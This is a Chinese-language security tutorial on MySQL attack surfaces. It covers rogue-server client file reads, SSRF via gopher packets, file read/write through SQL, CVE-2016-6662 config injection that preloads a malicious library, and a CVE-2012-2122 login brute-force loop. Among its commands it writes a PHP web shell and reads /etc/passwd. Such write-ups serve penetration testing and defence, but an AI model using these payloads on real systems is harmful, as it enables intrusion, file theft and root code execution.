> 原文链接: https://www.anquanke.com//post/id/219892 


# Mysql 数据库攻击面


                                阅读量   
                                **155619**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t0174be9554d985815c.jpg)](https://p1.ssl.qhimg.com/t0174be9554d985815c.jpg)



Mysql数据库在无论是在渗透测试还是正常使用都是比较常见的数据库，在十一假期期间总结梳理了mysql近些年的常见攻击利用方法，通过自己的实践分析也有了更深刻的认识，希望能对大家有帮助，这里分享给大家。



## 0x01 简单介绍

MySQL 是最流行的关系型数据库管理系统，在 WEB 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。

MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。



## 0x02 基础指令

在mysql的正常使用中以及mysql数据库攻击利用时，以下指令最常用，总结梳理如下

### <a class="reference-link" name="0x1%20%E5%88%9B%E5%BB%BA"></a>0x1 创建

```
create database hehe;//创建数据库

CREATE TABLE IF NOT EXISTS `runoob_tbl`(
   `runoob_id` INT UNSIGNED AUTO_INCREMENT,
   `runoob_title` VARCHAR(100) NOT NULL,
   `runoob_author` VARCHAR(40) NOT NULL,
   `submission_date` DATE,
   PRIMARY KEY ( `runoob_id` )
)ENGINE=InnoDB DEFAULT CHARSET=utf8;//创建数据表
```

### <a class="reference-link" name="0x2%20%E6%9F%A5%E7%9C%8B"></a>0x2 查看

```
show databases;
show tables;
show variables like '%secure%'; //查看安全属性

LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test FIELDS TERMINATED BY '\n';//读取客户端文件
```

### <a class="reference-link" name="0x3%20%E6%9B%B4%E6%96%B0%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%8F%8A%E6%9D%83%E9%99%90"></a>0x3 更新添加用户及权限

```
CREATE USER 'username'@'host' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;
DROP USER 'username'@'host';
flush privileges;
```

### <a class="reference-link" name="0x4%20%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"></a>0x4 文件读写

```
SELECT '&lt;? system($_GET[\'c\']); ?&gt;' INTO OUTFILE '/var/www/shell.php';
SELECT LOAD_FILE('/var/lib/mysql-files/aaa') AS Result;
select group_concat(id) from test INTO DUMPFILE "/var/lib/mysql-files/aaaa";
```



## 0x03 攻击面分析

### <a class="reference-link" name="0x1%20Mysql%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB"></a>0x1 Mysql 客户端任意文件读

> <p>适用范围： 全版本 MySQL/MariaDB Client<br>
条件：客户端连接时开启 –enable-local-infile</p>

[![](https://p5.ssl.qhimg.com/t0127ec3fd3010673f7.png)](https://p5.ssl.qhimg.com/t0127ec3fd3010673f7.png)

从结果上来看，客户端读取了自身指定的数据，抓取数据包分析整个流程。

<a class="reference-link" name="1.%20Client%20Send%203306"></a>**1. Client Send 3306**

192.168.0.114 是SqlServer 192.168.0.115为客户端

[![](https://p0.ssl.qhimg.com/t01a6affce0135bf7b2.png)](https://p0.ssl.qhimg.com/t01a6affce0135bf7b2.png)

<a class="reference-link" name="2.%20Server%20Send%20Greeting%20packet"></a>**2. Server Send Greeting packet**

服务端返回一个server端基础信息表包含版本，协议类型，salt值，server 功能项

[![](https://p3.ssl.qhimg.com/t017e763f15be593747.png)](https://p3.ssl.qhimg.com/t017e763f15be593747.png)

这里有一个server 功能表

[![](https://p1.ssl.qhimg.com/t014dfc6c6785b4f70c.png)](https://p1.ssl.qhimg.com/t014dfc6c6785b4f70c.png)

<a class="reference-link" name="3.%20Client%20Auth%20and%20Send%20capability"></a>**3. Client Auth and Send capability**

这个包可以说是客户端的登录包，包含用户名，密码，还有一份客户端能力表。

[![](https://p2.ssl.qhimg.com/t01026ae6c3c54af02a.png)](https://p2.ssl.qhimg.com/t01026ae6c3c54af02a.png)

[![](https://p0.ssl.qhimg.com/t01feddadccf69fabb2.png)](https://p0.ssl.qhimg.com/t01feddadccf69fabb2.png)

从图中可以看出client连接时开启了 —enable-local-infile 配置

<a class="reference-link" name="4.%20Client%20Queries"></a>**4. Client Queries**

接下来就是一些正常的客户端查询了

[![](https://p2.ssl.qhimg.com/t016611cdef8766e8fa.png)](https://p2.ssl.qhimg.com/t016611cdef8766e8fa.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0146206429e5ba656f.png)

[![](https://p2.ssl.qhimg.com/t01e81bb1cf829ba93b.png)](https://p2.ssl.qhimg.com/t01e81bb1cf829ba93b.png)

[![](https://p2.ssl.qhimg.com/t01cb9c22ea002f2276.png)](https://p2.ssl.qhimg.com/t01cb9c22ea002f2276.png)

<a class="reference-link" name="5.%20Client%20Send%20LOAD%20DATA%20LOCAL"></a>**5. Client Send LOAD DATA LOCAL**

最终客户端发送下面指令

[![](https://p2.ssl.qhimg.com/t01cc89aead6acc6c23.png)](https://p2.ssl.qhimg.com/t01cc89aead6acc6c23.png)

<a class="reference-link" name="6.%20Server%20Send%20Filename"></a>**6. Server Send Filename**

服务端收到这个执行语句后会给客户端以特定的协议格式发送一个包，类似于下面，功能类似于告诉客户端把这个文件发给我让我看看，如果连接时配置 –enable-local-infile 或者dsn 加上了allowAllFiles=true

[![](https://p2.ssl.qhimg.com/t0114058c2f25743850.png)](https://p2.ssl.qhimg.com/t0114058c2f25743850.png)

<a class="reference-link" name="7.%20%E5%85%B6%E4%BB%96"></a>**7. 其他**

攻击脚本 Rogue_Mysql [https://github.com/allyshka/Rogue-MySql-Server](https://github.com/allyshka/Rogue-MySql-Server)

PHP有一些mysql客户端扩展，如mysql、mysqli、pdo，除了pdo外都可以被利用，因为pdo默认禁止读取本地数据，你需要通过设置PDO::MYSQL_ATTR_LOCAL_INFILE为true来启用本地数据读取。同样的，如果客户端使用的是python的MySQLdb，也需要先设置local_infile连接选项。

### <a class="reference-link" name="0x2%20%E5%88%A9%E7%94%A8SSRF%20%E6%94%BB%E5%87%BBMysql"></a>0x2 利用SSRF 攻击Mysql

> <p>适用范围： 全版本 MySQL/MariaDB Server<br>
条件：拥有空密码用户</p>

在之前有道ctf题目利用gopher协议获取mysql数据库中的flag，这里需要了解mysql的完整交互协议，并且要伪造客户端，通过ssrf进行交互连接。下面只需要分析mysql的数据交互过程。

主要分成三个部分：登录认证报文，客户端请求报文以及服务器端返回报，基于mysql5.1.73(mysql4.1以后的版本)
1. TCP 三次握手
1. 服务端发送握手初始化报文
1. 客户端发送认证报文
1. 服务端发送认证结果报文
1. 客户端发送命令报文
**<a class="reference-link" name="1.%20TCP%20%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B"></a>1. TCP 三次握手**

[![](https://p2.ssl.qhimg.com/t01a938d18c5123c870.jpg)](https://p2.ssl.qhimg.com/t01a938d18c5123c870.jpg)

客户端与服务端进行TCP握手连接，确定连接信息。

<a class="reference-link" name="2.%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E9%80%81%E6%8F%A1%E6%89%8B%E5%88%9D%E5%A7%8B%E5%8C%96%E6%8A%A5%E6%96%87"></a>**2. 服务端发送握手初始化报文**

握手完成之后，服务端向客户端发送mysql相关信息，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0150d261162ff2cb2e.jpg)

[![](https://p5.ssl.qhimg.com/t0147031e35e1ebc5dd.jpg)](https://p5.ssl.qhimg.com/t0147031e35e1ebc5dd.jpg)

通过该数据包客户端将获取服务端提供的能力列表，以及获取挑战随机数，这将会在之后的客户端认证数据包中使用到。

<a class="reference-link" name="3.%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E9%80%81%E8%AE%A4%E8%AF%81%E6%8A%A5%E6%96%87"></a>**3. 客户端发送认证报文**

服务端生成挑战数(scramble)并发送给客户端，客户端用挑战数加密密码后返回相应结果，然后服务器检查是否与预期的结果相同，从而完成用户认证的过程。 值得注意的是，如果mysql的密码为空，那么加密密码就为空。

[![](https://p4.ssl.qhimg.com/t01f6671cee60334185.jpg)](https://p4.ssl.qhimg.com/t01f6671cee60334185.jpg)

客户端收到服务器发来的初始化报文后，会对服务器发送的权能标志进行修改，保留自身所支持的功能，然后将权能标志返回给服务器，从而保证服务器与客户端通讯的兼容性。

<a class="reference-link" name="4.%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%91%E9%80%81%E8%AE%A4%E8%AF%81%E7%BB%93%E6%9E%9C%E6%8A%A5%E6%96%87"></a>**4. 服务端发送认证结果报文**

mysql收到了客户端发过来的认证包，并且经过验证用户名密码都是正确的，这是客户端被允许登陆了，报文结构如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0199cb78fc8224ae60.png)

header = 0，表明是ok报文， server status = 02，表名设置自动提交成功。

<a class="reference-link" name="5.%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E9%80%81%E5%91%BD%E4%BB%A4%E6%8A%A5%E6%96%87"></a>**5. 客户端发送命令报文**

命令报文比较简单，第一个字节表示当前命令的类型，之后的数据就是要执行的命令。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014c5f20d14e293c07.jpg)

<a class="reference-link" name="6.%20%E6%9E%84%E9%80%A0%E6%95%B0%E6%8D%AE%E5%8C%85"></a>**6. 构造数据包**

因为没有密码的用户登陆mysql时不需要与sqlserver进行交互所以可以通过gopher协议通过一个数据包完成所有的交互，实现执行命令的目的。

通过命令行执行`mysql -h 127.0.0.1 -u root -e "select now();"`

利用wireshark 抓包获取

[![](https://p2.ssl.qhimg.com/t01b05ff099292ede85.jpg)](https://p2.ssl.qhimg.com/t01b05ff099292ede85.jpg)

我们只关心，数据包中的红色客户端部分，将它们都提取出来，通过nc发送数据包

```
data = "b500000185a2bf01000000012d0000000000000000000000000000000000000000000000726f6f74000063616368696e675f736861325f70617373776f72640078035f6f73086f737831302e3134095f706c6174666f726d067838365f36340f5f636c69656e745f76657273696f6e06382e302e31380c5f636c69656e745f6e616d65086c69626d7973716c045f706964053432343831076f735f757365720634637431306e0c70726f6772616d5f6e616d65056d7973716c00000003210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310d0000000373656c656374206e6f772829"
print data.decode("hex")
```

[![](https://p3.ssl.qhimg.com/t0122d5091ae70ddfe5.jpg)](https://p3.ssl.qhimg.com/t0122d5091ae70ddfe5.jpg)

如果要执行其他命令只需要修改其中的客户端命令数据包。

### <a class="reference-link" name="0x3%20Mysql%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"></a>0x3 Mysql 服务端文件读写

> <p>适用范围： 全版本 MySQL/MariaDB Client<br>
条件：服务端配置可读写目录和正确的用户权限</p>

<a class="reference-link" name="1.%20%E5%AE%89%E5%85%A8%E4%BF%9D%E6%8A%A4"></a>**1. 安全保护**

mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因,当读取位于服务器上的文本文件时,文件必须处于数据库目录或可被所有人读取。你可以通过执行`show variables like '%secure%'`来查看：

[![](https://p2.ssl.qhimg.com/t0105e7b9cc23d809a2.png)](https://p2.ssl.qhimg.com/t0105e7b9cc23d809a2.png)

secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, DUMPFILE and LOAD_FILE()可以操作的文件夹。

secure-file-priv的值可分为三种情况：
1. secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
1. 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹，就会报错
1. 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
除此之外读取或写入文件必须拥有可操作的用户权限否则会报错：

```
ERROR 1045 (28000): Access denied for user
```

<a class="reference-link" name="2.%20%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"></a>**2. 读取文件**

```
SELECT LOAD_FILE('/var/lib/mysql-files/aaa') AS Result;
```

```
create database test;
CREATE TABLE test ( id TEXT, content TEXT);
load data infile "/var/lib/mysql-files/aaa" into table test.test FIELDS TERMINATED BY '\n\r';
```

<a class="reference-link" name="3.%20%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"></a>**3. 写入文件**

```
select group_concat(id) from test INTO DUMPFILE "/var/lib/mysql-files/aaaa";
```

[![](https://p0.ssl.qhimg.com/t011838a76284acc148.png)](https://p0.ssl.qhimg.com/t011838a76284acc148.png)

### <a class="reference-link" name="0x4%20Mysql%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20%EF%BC%88CVE-2016-6662%EF%BC%89"></a>0x4 Mysql远程代码执行/权限提升漏洞 （CVE-2016-6662）

> 版本范围：MySQL &lt;= 5.7.14 MySQL &lt;= 5.6.32 MySQL &lt;= 5.5.51， 远程代码执行/ 提权 (0day)，包括mysql的分支版本MariaDB，PerconaDB

利用条件要具有FILE和SELECT权限的mysql的用户且能够访问日志功能（通常情况下只有MYSQL的管理员用户具有）

<a class="reference-link" name="1.%20%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0"></a>1. 漏洞原因
- MySQL的默认安装包里自带了一个mysqld_safe的脚本用来启动mysql的服务进程
- 该进程能够在启动mysql server之前预加载共享库文件，通过参数 –malloc-lib = LIB /usr/local/mysql/bin/mysqld_safe:
- 一旦攻击者可以注入恶意库文件在my.cnf文件中，即可在mysql服务重启时以root权限执行预加载的任意共享库中的任意代码
<a class="reference-link" name="2.%20%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"></a>**2. 利用场景**
- 在MYSQL已存在的具有弱权限或者权限设置不安全的配置文件（mysql用户可写）里注入恶意代码
- 在MYSQL的data目录里（mysql用户默认可写）创建一个新的配置文件my.cnf，并注入恶意代码
<a class="reference-link" name="3.%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>**3. 漏洞利用**

首先通过sql查询创建配置文件

```
mysql&gt; set global general_log_file = '/usr/local/mysql/data/my.cnf';
mysql&gt; set global general_log = on;
mysql&gt; select '
    '&gt; 
    '&gt; ; injected config entry
    '&gt; 
    '&gt; [mysqld]
    '&gt; malloc_lib=/tmp/exploit.so
    '&gt; 
    '&gt; [separator]
    '&gt; 
    '&gt; ';
1 row in set (0.00 sec)
mysql&gt; set global general_log = off;
```

之后重启mysql服务，即可执行tmp文件夹下的exploit.so文件

### <a class="reference-link" name="0x5%20Mysql%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-2122%EF%BC%89"></a>0x5 Mysql 身份认证绕过漏洞（CVE-2012-2122）

> <p>版本范围 ：<br>
MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.<br>
MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.</p>

当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。

漏洞复现 [https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122](https://github.com/vulhub/vulhub/tree/master/mysql/CVE-2012-2122) 直接搭建docker环境

在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：

```
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
```

[![](https://p3.ssl.qhimg.com/t0133111762e83898ef.jpg)](https://p3.ssl.qhimg.com/t0133111762e83898ef.jpg)



## 0x04 总结

总结了mysql客户端任意文件读取利用、利用SSRF攻击Mysql数据库获取数据、SQL注入中文件读写利用、特定版本Mysql提取获取shell漏洞以及很古老的mysql身份绕过认证，这些攻击技巧是之前频繁出现的利用方法，后续将分析关于postgres等数据的攻击利用方法。



## 0x05 参考文献

[http://www.nsoad.com/Article/Vulnerabilityanalysis/20160913/391.html](http://www.nsoad.com/Article/Vulnerabilityanalysis/20160913/391.html)<br>[https://www.freebuf.com/articles/web/159342.html](https://www.freebuf.com/articles/web/159342.html)<br>[https://www.anquanke.com/post/id/84553](https://www.anquanke.com/post/id/84553)<br>[https://www.imooc.com/article/258850?block_id=tuijian_wz](https://www.imooc.com/article/258850?block_id=tuijian_wz)<br>[https://blog.csdn.net/weixin_34255793/article/details/90309996](https://blog.csdn.net/weixin_34255793/article/details/90309996)
